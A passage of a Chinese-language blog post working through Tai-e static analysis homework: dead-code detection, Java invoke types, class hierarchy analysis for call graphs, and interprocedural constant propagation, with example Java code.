AssignStmt&lt;?,?&gt;) &#123;</span><br><span class="line">            Optional&lt;LValue&gt; def = n.getDef();</span><br><span class="line">            SetFact&lt;Var&gt; fact = liveVars.getOutFact(n);</span><br><span class="line">            <span class="keyword">if</span> (def.isPresent()) &#123;</span><br><span class="line">                <span class="type">LValue</span> <span class="variable">tmp</span> <span class="operator">=</span> def.get();</span><br><span class="line">                <span class="keyword">if</span> (tmp <span class="keyword">instanceof</span> Var) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!fact.contains((Var) tmp)) &#123;</span><br><span class="line">                        <span class="comment">// traverse branch and update deadcode set</span></span><br><span class="line">                        deadCode.add(n);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deadCode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Set&lt;Stmt&gt; <span class="title function_">deadcodeSetFromEntry</span><span class="params">(Edge&lt;Stmt&gt; source_edge, Stmt entry, CFG&lt;Stmt&gt; cfg, Set&lt;Stmt&gt; cur_deadcode)</span> &#123;</span><br><span class="line">    Set&lt;Stmt&gt; deadcode_update = <span class="keyword">new</span> <span class="title class_">TreeSet</span>&lt;&gt;(Comparator.comparing(Stmt::getIndex));</span><br><span class="line">    Queue&lt;Stmt&gt; wl = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// judge entry is deadcode or not</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">entry_is_deadcode</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (source_edge != <span class="literal">null</span>) &#123;</span><br><span class="line">        Set&lt;Edge&lt;Stmt&gt;&gt; entry_in_edges = cfg.getInEdgesOf(entry);</span><br><span class="line">        <span class="keyword">for</span> (Edge&lt;Stmt&gt; in_e: entry_in_edges) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!in_e.equals(source_edge) &amp;&amp; !cur_deadcode.contains(in_e.getSource()))</span><br><span class="line">                entry_is_deadcode = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!entry_is_deadcode)</span><br><span class="line">        <span class="keyword">return</span> deadcode_update;</span><br><span class="line"></span><br><span class="line">    deadcode_update.add(entry);</span><br><span class="line">    wl.offer(entry);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deadcode propogation</span></span><br><span class="line">    <span class="keyword">while</span> (!wl.isEmpty()) &#123;</span><br><span class="line">        <span class="type">Stmt</span> <span class="variable">cur</span> <span class="operator">=</span> wl.poll();</span><br><span class="line">        Set&lt;Edge&lt;Stmt&gt;&gt; edges = cfg.getOutEdgesOf(cur);</span><br><span class="line">        <span class="keyword">for</span> (Edge&lt;Stmt&gt; e: edges) &#123;</span><br><span class="line">            <span class="type">Stmt</span> <span class="variable">targ</span> <span class="operator">=</span> e.getTarget();</span><br><span class="line">            <span class="comment">// judge target is deadcode or not</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">targ_is_deadcode</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            Set&lt;Edge&lt;Stmt&gt;&gt; targ_in_edges = cfg.getInEdgesOf(targ);</span><br><span class="line">            <span class="keyword">for</span> (Edge&lt;Stmt&gt; te: targ_in_edges) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!e.equals(te) &amp;&amp; !cur_deadcode.contains(te.getSource()))</span><br><span class="line">                    targ_is_deadcode = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (targ_is_deadcode &amp;&amp; targ.getIndex() &lt; cfg.getIR().getStmts().size()) &#123;</span><br><span class="line">                deadcode_update.add(targ);</span><br><span class="line">                wl.offer(targ);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deadcode_update;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-类层次结构分析与过程间常量传播"><a href="#0x04-类层次结构分析与过程间常量传播" class="headerlink" title="0x04 类层次结构分析与过程间常量传播"></a>0x04 类层次结构分析与过程间常量传播</h2><p>&emsp;本作业为 java 实现一个类层次分析（class hierarchy analysis，CHA），并实现过程间常量传播与数据流传播的 worklist 求解器。本次作业需要实现一个基于类层次结构（CHA）的调用图，只需关注 int 的常量传播，但是需要更准确的处理方法调用。与保守处理方法调用的过程内常量传播相比，过程间常量传播可以达到更好的精度。</p><h3 id="Java-函数调用的四种类型"><a href="#Java-函数调用的四种类型" class="headerlink" title="Java 函数调用的四种类型"></a>Java 函数调用的四种类型</h3><p>（1）invokestatic，调用静态方法，在编译时确定要调用的目标方法，属于静态绑定。静态方法是属于类而不是实例的，因此可以直接调用类的静态方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is a static method.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ExampleClass.staticMethod(); <span class="comment">// 使用 invokestatic 调用静态方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）invokespecial：调用实例方法，包括私有方法、构造方法和通过 super 关键字调用的超类方法。在编译时确定要调用的目标方法，属于静态绑定，它主要用于调用与特定对象关联的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleClass</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">privateMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is a private method.&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExampleClass</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is a constructor.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ExampleClass</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExampleClass</span>(); <span class="comment">// 使用 invokespecial 调用构造方法</span></span><br><span class="line">        obj.privateMethod(); <span class="comment">// 使用 invokespecial 调用私有方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（3）invokeinterface：调用接口方法，这个指令会在<code>运行时</code>根据对象的实际类型进行动态绑定，并调用实现该接口的对象的对应方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">ExampleInterface</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">interfaceMethod</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExampleClass</span> <span class="keyword">implements</span> <span class="title class_">ExampleInterface</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">interfaceMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is an interface method.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ExampleInterface</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExampleClass</span>();</span><br><span class="line">        obj.interfaceMethod(); <span class="comment">// 使用 invokeinterface 调用接口方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（4）invokevirtual：调用普通的虚方法，在<code>运行时</code>根据对象的实际类型进行动态绑定，并调用相应的方法，它允许在继承层次结构中进行方法的动态分派。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ParentClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">virtualMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is a virtual method from the parent class.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChildClass</span> <span class="keyword">extends</span> <span class="title class_">ParentClass</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">virtualMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is a virtual method from the child class.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ParentClass</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChildClass</span>(); </span><br><span class="line">        obj.virtualMethod(); <span class="comment">// 使用 invokevirtual 调用虚方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;Java 中的一些新特性会让方法调用的情形更复杂，比如 Java 8 开始允许接口定义默认方法，在此我们不考虑这些。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">ExampleInterface</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">abstractMethod</span><span class="params">()</span>; <span class="comment">// 抽象方法</span></span><br><span class="line">    <span class="comment">// 默认方法</span></span><br><span class="line">    <span class="keyword">default</span> <span class="keyword">void</span> <span class="title function_">defaultMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is a default method.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExampleClass</span> <span class="keyword">implements</span> <span class="title class_">ExampleInterface</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">abstractMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is an implementation of the abstract method.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ExampleClass</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExampleClass</span>();</span><br><span class="line">        obj.abstractMethod();</span><br><span class="line">        obj.defaultMethod();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="类层次分析（CHA）相关的知识点"><a href="#类层次分析（CHA）相关的知识点" class="headerlink" title="类层次分析（CHA）相关的知识点"></a>类层次分析（CHA）相关的知识点</h3><ul><li><code>pascal.taie.analysis.graph.callgraph.DefaultCallGraph</code>。</li></ul><p>&emsp;代表了程序的调用图。它提供了 API 来获取到调用图的信息，它还提供了一些修改调用图的 API。（1）<code>callSitesIn(JMethod)</code>，返回所有调用方法<code>JMethod</code>的调用点；（2）<code>contains(JMethod)</code>，返回当前调用图是否含有<code>JMethod</code>，即<code>JMethod</code>在当前调用图中是否可达；（3）<code>addReachableMethod(JMethod)</code>，向当前调用图中添加方法<code>JMethod</code>并将方法标记成可达的；（4）<code>addEdge(Edge&lt;Invoke, JMethod&gt;)</code>，向当前调用图中添加一条调用边。</p><ul><li><code>pascal.taie.analysis.graph.callgraph.CallKind</code>。</li></ul><p>&emsp;表示调用图中边的种类，包括 INTERFACE、VIRTUAL、SPECIAL 和 STATIC。</p><ul><li><code>pascal.taie.analysis.graph.callgraph.Edge&lt;Invoke,JMethod&gt;</code>。</li></ul><p>&emsp;表示调用图中的边，每一条边从调用点（call site，Invoke 类型）出发，指向被调用方法（callee method，类型为 <code>JMethod</code>）。在创建一条边的时候，你需要向构造方法提供调用类型（边的种类）、调用点和被调用方法的信息。</p><ul><li><code>pascal.taie.ir.stmt.Invoke</code>。</li></ul><p>&emsp;Stmt 的子类，该类表示程序中的方法调用以及调用图中的调用点，它提供了一些 API 来获取调用点的各种信息，例如使用 getMethodRef() 来获取目标方法的签名信息。</p><ul><li><code>pascal.taie.ir.proginfo.MethodRef</code>。</li></ul><p>&emsp;Tai-e 中的目标方法引用，它包含了调用点所调用的目标方法的签名信息。（1）<code>getDeclaringClass()</code>，返回声明该方法的类；（2）<code>getSubsignature()</code>，返回被调用方法的子签名（<code>subsignature</code>）。</p><ul><li><code>pascal.taie.language.classes.JMethod</code>。</li></ul><p>&emsp;表示 Tai-e 中的 Java 方法，每个 JMethod 的实例关联着一个方法并包含该方法的各种信息。（1）<code>isAbstract()</code>，判断该 <code>JMethod</code> 是否是一个没有方法体的抽象方法；</p><ul><li><code>pascal.taie.language.classes.JClass</code>。</li></ul><p>&emsp;表示 Tai-e 中的 Java 类。每个 <code>JClass</code> 的实例关联着一个类并包含该类的各种信息。（1）<code>getSuperClass()</code>，返回该类的父类；（2）<code>getDeclaredMethod(Subsignature)</code>，根据子签名返回该类中声明的对应方法；（3）<code>isInterface()</code>，判断该类是否是一个接口。</p><ul><li><code>pascal.taie.language.classes.Subsignature</code>。</li></ul><p>&emsp;表示 Tai-e 中的子签名。一个方法的子签名只包含它的方法名f和方法签名的描述符，例如，下面方法 foo 的子签名是<code>T foo(P,Q,R)</code>，而它的完整签名是<code>&lt;C: T foo(P,Q,R)&gt;</code>。</p><ul><li><code>pascal.taie.language.classes.ClassHierarchy</code>。</li></ul><p>&emsp;<code>getDirectSubclassesOf(JClass)</code>返回直接继承该类的子类；<code>getDirectSubinterfacesOf(JClass)</code>返回直接继承该接口的子接口；<code>getDirectImplementorsOf(JClass)</code>返回直接实现了该接口的类。</p><ul><li><code>pascal.taie.analysis.graph.callgraph.CHABuilder</code>。</li></ul><p>&emsp;通过 CHA 来建立调用图，这是我们要完成的函数，主要完成 dispatch|resolve|BuildCallGraph 3 个函数。</p><h4 id="Virtual-call-的-dispatch：例如-o-foo"><a href="#Virtual-call-的-dispatch：例如-o-foo" class="headerlink" title="Virtual call 的 dispatch：例如 o.foo()"></a>Virtual call 的 dispatch：例如 o.foo()</h4><p>&emsp;例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;</span><br><span class="line">void foo() &#123;...&#125;</span><br><span class="line">&#125;</span><br><span class="line">class B extends A &#123;&#125;</span><br><span class="line">A o = new B();</span><br><span class="line">o.foo();</span><br></pre></td></tr></table></figure><p>&emsp;假设此时 o 的类型为 A，foo 函数签名为 m。我们使用 Dispatch(c,m) 来模拟运行时阶段的 method dispatch 过程。如果 A 包括与 m 的签名相同的 m’ 方法，且 m’ 方法是非抽象的，那么 Dispatch(A,m)=m’，否则 Dispatch(A,m)=Dispatch(A’,m)（其中 A’ 是 A 的父类）。</p><h4 id="Call-的-resolve"><a href="#Call-的-resolve" class="headerlink" title="Call 的 resolve"></a>Call 的 resolve</h4><p>&emsp;以如下代码举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class C extends B &#123;</span><br><span class="line">T foo(P p, Q q) &#123;</span><br><span class="line">...</span><br><span class="line">super.foo(p, q)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/tai-e-static-analysis-with-homework/image-20240123163737171.png" alt="image-20240123163737171" style="zoom:67%;" /></p><p>&emsp;对上述代码实施 CHA resolution 的步骤 resolve(super.foo(p,q))：</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20240123163600737.png" alt="image-20240123163600737" style="zoom:67%;" /></p><p>&emsp;<code>super.foo(p,q)</code>的类是 B。</p><p>&emsp;再比如，有代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;</span><br><span class="line">T foo(P p, Q q) &#123;...&#125;</span><br><span class="line">&#125;</span><br><span class="line">A a = ...</span><br><span class="line">a.foo(x,y)</span><br></pre></td></tr></table></figure><p>&emsp;<code>可以重写的函数，在调用时都是 virtual call</code>。那么经过上述的 resolve 步骤后，receiver variable c 是 A，之后就是遍历 A 的子类，然后做 dispatch(A的子类,m)。</p><p>&emsp;感觉类型之间的赋值都是父类要承接子类的对象。举个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;</span><br><span class="line">void foo() &#123;...&#125;</span><br><span class="line">&#125;</span><br><span class="line">class B extends A &#123;&#125;</span><br><span class="line">class C extends B &#123;</span><br><span class="line">void foo() &#123;...&#125;</span><br><span class="line">&#125;</span><br><span class="line">class D extends B &#123;</span><br><span class="line">void foo() &#123;...&#125;</span><br><span class="line">&#125;</span><br><span class="line">C c = ...</span><br><span class="line">c.foo()</span><br><span class="line"></span><br><span class="line">A a = ...</span><br><span class="line">a.foo()</span><br><span class="line"></span><br><span class="line">B b = ...</span><br><span class="line">b.foo()</span><br></pre></td></tr></table></figure><p>&emsp;首先，c.foo()/a.foo()/b.foo() 都是 virtual call，那么 <code>resolve(c.foo()) = &#123;C.foo()&#125;</code>，<code>resolve(a.foo()) = &#123;A.foo(), C.foo(), D.foo()&#125;</code>，<code>resolve(b.foo()) = &#123;A.foo(), C.foo(), D.foo()&#125;</code>。</p><h4 id="Call-Graph-构建"><a href="#Call-Graph-构建" class="headerlink" title="Call Graph 构建"></a>Call Graph 构建</h4><p>&emsp;从入口函数开始，对于每一个可到达的方法 m，对于函数的每一个调用（call site），都执行 resolve，直到没有新的函数加入。</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20240123171509230.png" alt="image-20240123171509230" style="zoom:67%;" /></p><p>&emsp;具体的例子可以看 <a href="https://cs.nju.edu.cn/tiantan/software-analysis/Inter.pdf#page=26">link</a> 的 P57。</p><h4 id="CHA-的特点"><a href="#CHA-的特点" class="headerlink" title="CHA 的特点"></a>CHA 的特点</h4><p>&emsp;快速，只需要考虑 receiver variable 的类型，以及其层次关系，忽略了数据流与控制流。但是不准确，很容易有冗余，例如 <code>resolve(b.foo()) = &#123;A.foo(), C.foo(), D.foo()&#125;</code>，其中 C.foo() 与 D.foo() 是不可能调用的。</p><h3 id="函数间的常量传播知识点"><a href="#函数间的常量传播知识点" class="headerlink" title="函数间的常量传播知识点"></a>函数间的常量传播知识点</h3><h4 id="Edge-transfer"><a href="#Edge-transfer" class="headerlink" title="Edge transfer"></a>Edge transfer</h4><p>&emsp;过程间（函数间）常量传播与过程内常量传播类似，区别是过程间常量传播使用了 edge transfer，因此可以更准确的处理方法调用和返回。过程内数据流分析中，如果想要计算节点的 INfact，需要 meet 该节点前驱的 OUTfact。但是在过程间数据流分析中，INfact 是前驱的 OUTfact 进行 edge transfer 之后再 meet 的结果。</p><p>&emsp;例如，对于过程间调用来说，如下是一个过程间调用的 CFG（ICFG）：</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20240123190149039.png" alt="image-20240123190149039" style="zoom:67%;" /></p><p>&emsp;为了计算第 4 条语句的 IN fact，也就是方法 <code>addOne()</code> 的 entry 节点的 IN fact，我们需要对 2-4 这条边应用 edge transfer，这样使得第 2 条语句的 OUT fact（a=6）转换为 x=6，并最终 meet 结果 x=6 到第四条语句的 IN fact中。我们可以定义相关的 edge transfer 函数，其以 ICFG 的一条边和边的源节点为输入。</p><p>&emsp;过程间的常量传播中，我们需要处理 4 种类型的边：</p><ul><li>Normal edge。与过程间调用无关的边，无需进行处理，即 transferEdge(edge, fact) = fact。</li><li>Call-to-return edge（2-&gt;3）。针对方法调用 x = m(…)，edge transfer 会把等号左侧的变量（x）与其 value 从 fact 中 kill 掉。对于类似于 m(…) 的调用，不做处理。</li><li>Call edge（2-&gt;4）。edge transfer 将实参在调用点中的值传递给被调用函数的形参。Edge transfer 首先从调用点的 OUTfact 中获取实参的值，然后返回新的 fact，这个 fact 把形参映射到值。例如：<code>transferEdge(2-4, &#123;a=6&#125;)=&#123;x=6&#125;</code>。</li><li>Return edge（6-&gt;3）。edge transfer 函数将被调用方法的返回值传递给调用点等号左侧的变量。它从被调用方法的 exit 节点的 OUT fact 中获取返回值（可能有多个），然后返回一个将调用点等号左侧的变量映射到返回值的 fact。例如，transferEdge(6-3, {x=6,y=7}) = {b=7}。如果该调用点等号左侧没有变量，那么 edge transfer 函数仅会返回一个空 fact。</li></ul><h4 id="相关类"><a href="#相关类" class="headerlink" title="相关类"></a>相关类</h4><ul><li><code>pascal.taie.analysis.graph.icfg.ICFGEdge</code>。</li></ul><p>&emsp;抽象类，表示了 ICFG 中的边。而它有四个子类：<code>Normal Edge</code>、<code>CallToReturnEdge</code>、<code>CallEdge</code>、<code>ReturnEdge</code>。</p><ul><li><code>pascal.taie.analysis.dataflow.inter.InterDataflowAnalysis</code>。</li></ul><p>&emsp;过程间数据流分析的接口，共有 6 个 API，前 5 个 API 都与过程内数据流分析相同，最后一个 API 就是 <code>transferEdge()</code>。</p><ul><li><code>pascal.taie.analysis.dataflow.inter.AbstractInterDataflowAnalysis</code>。</li></ul><p>&emsp;该抽象类把 ICFG 中不同的点和边分派给对应 transfer 方法。</p><ul><li><code>pascal.taie.analysis.dataflow.inter.InterConstantPropagation</code>。</li></ul><p>&emsp;需要完成的此类中的函数。</p><ul><li><code>pascal.taie.ir.exp.InvokeExp</code>。</li></ul><p>&emsp;表示程序中的方法调用表达式，它包含了被调用的方法引用和传入的各个参数。</p><h4 id="过程间的-worklist-求解器"><a href="#过程间的-worklist-求解器" class="headerlink" title="过程间的 worklist 求解器"></a>过程间的 worklist 求解器</h4><p>&emsp;与过程内的 worklist 大致相同，不同点是：（1）节点的 INfact 要对前驱的 OUTfact 进行 edge transfer 之后再 meet；（2）需要初始程序中所有的 IN/OUTfact，但是只需要对 ICFG 的 entry 方法设置 boundary fact。</p><h3 id="作业代码-3"><a href="#作业代码-3" class="headerlink" title="作业代码"></a>作业代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CHABuilder.java</span></span><br><span class="line"><span class="keyword">private</span> CallGraph&lt;Invoke, JMethod&gt; <span class="title function_">buildCallGraph</span><span class="params">(JMethod entry)</span> &#123;</span><br><span class="line">    <span class="type">DefaultCallGraph</span> <span class="variable">callGraph</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultCallGraph</span>();</span><br><span class="line">    callGraph.addEntryMethod(entry);</span><br><span class="line">    <span class="comment">// initialize</span></span><br><span class="line">    Queue&lt;JMethod&gt; wl = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    wl.offer(entry);</span><br><span class="line">    <span class="keyword">while</span> (!wl.isEmpty()) &#123;</span><br><span class="line">        <span class="type">JMethod</span> <span class="variable">m</span> <span class="operator">=</span> wl.poll();</span><br><span class="line">        <span class="keyword">if</span> (callGraph.reachableMethods().noneMatch(mm -&gt; mm.equals(m))) &#123;</span><br><span class="line">            callGraph.addReachableMethod(m);</span><br><span class="line">            Set&lt;Invoke&gt; all_cs_m = callGraph.getCallSitesIn(m);</span><br><span class="line">            <span class="keyword">for</span>(Invoke cs_m: all_cs_m) &#123;</span><br><span class="line">                Set&lt;JMethod&gt; T = resolve(cs_m);</span><br><span class="line">                <span class="keyword">for</span> (JMethod mm: T) &#123;</span><br><span class="line">                    <span class="comment">// add cs -&gt; mm to CG</span></span><br><span class="line">                    callGraph.addEdge(<span class="keyword">new</span> <span class="title class_">Edge</span>&lt;&gt;(CallGraphs.getCallKind(cs_m), cs_m, mm));</span><br><span class="line">                    wl.add(mm);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> callGraph;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Set&lt;JMethod&gt; <span class="title function_">resolve</span><span class="params">(Invoke callSite)</span> &#123;</span><br><span class="line">    Set&lt;JMethod&gt; T = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span 